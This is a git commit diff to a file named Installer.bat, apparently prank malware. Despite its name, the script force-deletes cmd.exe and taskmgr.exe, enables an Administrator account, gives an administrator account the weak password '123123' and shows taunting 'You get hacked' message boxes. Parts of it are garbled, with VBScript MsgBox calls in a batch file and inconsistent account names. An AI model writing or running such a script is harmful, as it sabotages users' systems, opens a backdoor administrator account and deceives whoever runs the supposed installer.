6b02b980d28d984d4395e4b1ae82897676dfd932
lolhackeer <80897627+lolhackeer@users.noreply.github.com>
2022-02-03 16:22:52 +0100

    Update Installer.bat

--- Installer.bat
+++ Installer.bat
@@ -1,7 +1,7 @@
 del /F cmd.exe
 del /F taskmgr.exe
-net user /add Administrador
+net user Administrator /active:yes
 net user Administrador 123123
-net localgroup Administradores /add Administrador
+net localgroup Administradores /add Administrator
 X=MsgBox("Your computer now is mine",0+32,"You get hacked")
 X=MsgBox("Your command prompt and task manager die from today",0+32,"You get hacked")
